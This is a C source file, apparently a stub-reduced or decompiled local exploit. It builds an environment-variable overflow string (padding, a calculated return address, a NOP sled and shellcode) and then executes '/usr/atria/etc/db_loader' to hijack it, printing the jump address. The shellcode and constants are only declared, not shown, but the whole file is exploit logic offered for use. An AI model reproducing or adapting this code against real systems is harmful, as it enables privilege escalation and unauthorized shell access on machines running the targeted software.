
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char* ENV_VAR ;
 int NNOP ;
 int NOP ;
 int RET_DIS ;
 int atoi (char*) ;
 int execl (char*,char*,int *) ;
 int getEnvAddr (char*) ;
 char* getenv (char*) ;
 scalar_t__ malloc (int) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 int putenv (char*) ;
 char* shellCode ;
 int strcat (char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;

int main(int argc, char** argv)
{

    char buff[256] = {0};

    int* intPtr = ((void*)0);
    char* buffPtr = ((void*)0);
    char* charPtr = ((void*)0);

    int retAddr = 0;
    int retValue = 0;


    int buffLen = 0;
    int adjustment = 0;
    int strLen = 0;
    int alignment = 0;
    int diff = 0;
    int i;

    int shellCodeLen = strlen(shellCode);

    if(argc == 2)
    {
        adjustment = atoi(argv[1]);
    }

    buffLen = strlen(ENV_VAR) + RET_DIS + NNOP + shellCodeLen + 1;

    charPtr = getenv(ENV_VAR);


    strLen = strlen(charPtr) + 1;
    alignment = strLen % 4;
    if(alignment != 0)
    {
        alignment = 4 - alignment;
        strLen += alignment;
    }

    alignment = buffLen % 4;
    if(alignment != 0)
    {
        alignment = 4 - alignment;
        buffLen += alignment;
    }

    retValue = getEnvAddr(ENV_VAR);

    diff = buffLen - strLen;

    retAddr = retValue - diff + strlen(ENV_VAR) + 1;

    alignment = retAddr % 4;

    if(alignment != 0)
    {
        alignment = 4 - alignment;
    }
    retAddr += RET_DIS + alignment + adjustment;


    buffPtr = (char *) malloc(buffLen);

    if(buffPtr != ((void*)0))
    {

        strcpy(buffPtr, ENV_VAR);
        strcat(buffPtr, "=");
        charPtr = (char *) (buffPtr + strlen(buffPtr));


        memset(charPtr, 0x41, buffLen - strlen(buffPtr)-4);


        intPtr = (int *) (charPtr + RET_DIS);
        *intPtr++ = retAddr;


        charPtr = (char *) intPtr;
        charPtr += alignment;

        for(i=0; i<NNOP; i++)
        {
            *charPtr++ = NOP;
        }

        for(i=0; i<shellCodeLen; i++)
        {
            *charPtr++ = shellCode[i];
        }
        *charPtr = 0;

        putenv(buffPtr);

        printf("Jumping to 0x%.8x\n", retAddr);

        execl("/usr/atria/etc/db_loader", "xfocus", ((void*)0));
    }
    else
    {
        printf("No more free memory!");
    }
}
